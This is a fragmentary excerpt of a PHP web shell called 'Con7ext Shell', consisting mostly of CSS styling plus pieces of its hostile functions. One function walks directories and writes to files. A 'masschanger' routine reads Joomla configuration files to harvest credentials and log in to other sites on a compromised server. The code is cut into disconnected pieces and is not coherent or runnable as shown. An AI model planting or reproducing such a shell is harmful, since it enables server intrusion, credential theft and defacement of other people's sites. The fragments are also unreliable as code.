...
<title>Con7ext Shell</title></marquee>
  <meta charset="utf-8">
...
li a:hover{
color:#fff;background:orange;text-decoration: none;
}
thead{
...
.a_phpinfo{
background:#15ff00;color:#fff;border:1px solid #fff;text-align:center;
}
.a_phpinfo th,.a_phpinfo tr,.a_phpinfo td{
border-collapse:collapse;border:1px solid white;
}
option{
background:#15ff00;color:white;border:0;}
}
.table_home, .td_home {
    border: 1px solid #191919;
}
...
option:hover {
background:#15ff00;color:cyan;border:0;}

}.a_exp{border:1px solid #fff;border-collapse: collapse;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #15ff00; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #15ff00;-moz-box-shadow: 0px 4px 2px #15ff00;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #15ff00;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
	...
	function gass(){
		...
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #15ff00;'><strong>$dirr/</span>$file</strong> ====> ";
  ...
  if($_POST['masschanger']) {
    ...
    foreach($link as $file_conf) {
      ...
      if(preg_match("/JConfig|joomla/",$config)) {
        ...
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa diambil nama domennya jancok</font><br>";
        } else {
        ...
        if($target == '') {
          ...
          $url_target = "Login => <font color=red>error, gabisa diambil nama domennya jancok</font><br>";
          if($target2 == '') {
            $url_target2 = "Login => <font color=red>error, gabisa diambil nama domennya jancok</font><br>";
          } else {
